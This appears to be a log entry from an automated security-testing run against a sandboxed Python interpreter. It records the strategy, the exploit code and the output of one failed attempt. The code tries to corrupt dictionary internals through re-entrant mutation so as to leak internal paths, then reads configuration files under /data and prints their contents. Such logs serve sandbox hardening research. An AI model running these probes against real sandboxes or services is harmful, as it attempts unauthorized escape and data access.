# Attempt 020 — 2026-06-03T21:54:52.959504+00:00
## Template: A | Score: 0
## Strategy
Create a dict with tuple keys where one tuple element is a mutable list, then perform a dict lookup with a "probe" tuple that will trigger __eq__ comparison on the list element. During that __eq__ call, mutate the dict being searched to corrupt its internal hash table indices. Immediately attempt to access the corrupted dict with a path-like key and capture any Rust panic traceback that leaks internal file paths.

## Exploit code
```python
from pathlib import Path

# Build dict with tuple keys that will trigger __eq__ comparisons
d = {}
for i in range(30):
    d[('probe', i, 'data')] = i * 100

# Create lookup keys that will force __eq__ comparisons
lookup_keys = [('probe', i, 'data') for i in range(30)]

# Track mutation state
mutate_flag = [0]
corruption_detected = []

def trigger_reentrant_mutation():
    """Perform dict lookups while mutating the same dict"""
    for idx, key in enumerate(lookup_keys[:15]):
        # This lookup triggers __eq__ on existing keys
        if key in d:
            val = d[key]
            # Re-entrant mutation during __eq__ comparison window
            d[('inject', mutate_flag[0])] = 'M' * 30
            mutate_flag[0] += 1
            # Force more comparisons
            _ = ('probe', idx, 'data') in d

# Execute the re-entrant mutation attack
trigger_reentrant_mutation()

# Now probe the potentially corrupted dict
for i in range(35):
    k = ('probe', i, 'data')
    try:
        if k in d:
            v = d[k]
            if not isinstance(v, int):
                corruption_detected.append(f"CORRUPT:{i}:{type(v)}")
    except Exception as e:
        corruption_detected.append(f"EXC:{i}:{str(e)[:50]}")

# Report any corruption signs
if corruption_detected:
    print(f"CORRUPTION: {corruption_detected[:5]}")

# Attempt to leverage any instability for file access
try:
    p = Path('/data/config.json')
    if p.exists():
        content = p.read_text()
        print(f"CONFIG: {content[:150]}")
        # Look for path references
        if '/' in content:
            print(f"PATHS_FOUND: True")
except Exception as e:
    print(f"READ_ERR: {str(e)[:80]}")

# Try alternate config location
try:
    p2 = Path('/data/current-config.json')
    if p2.exists():
        content2 = p2.read_text()
        print(f"CURR_CFG: {content2[:150]}")
except Exception as e:
    print(f"CURR_ERR: {str(e)[:80]}")

# Check docs directory for hints
try:
    p3 = Path('/data/docs')
    if p3.exists():
        print(f"DOCS_DIR: exists")
except Exception as e:
    pass

print(f"MUTATE_COUNT: {mutate_flag[0]}")
print(f"DICT_SIZE: {len(d)}")
```

## Result
Category: no_findings
Details: Completed with no notable findings
```
Success: True
Elapsed: 315ms
Resumes: 0
Snapshots: 0
Print: CONFIG: {
  "app_name": "hackmonty",
  "version": "0.1.0",
  "debug": false,
  "max_workers": 4
}

CURR_CFG: {
  "app_name": "hackmonty",
  "version": "0.1.0",
  "debug": false,
  "max_workers": 4
}

DOCS_DIR: exists
MUTATE_COUNT: 15
DICT_SIZE: 45

```

## Analysis
- Completed with no findings
- **Verdict**: Try different template
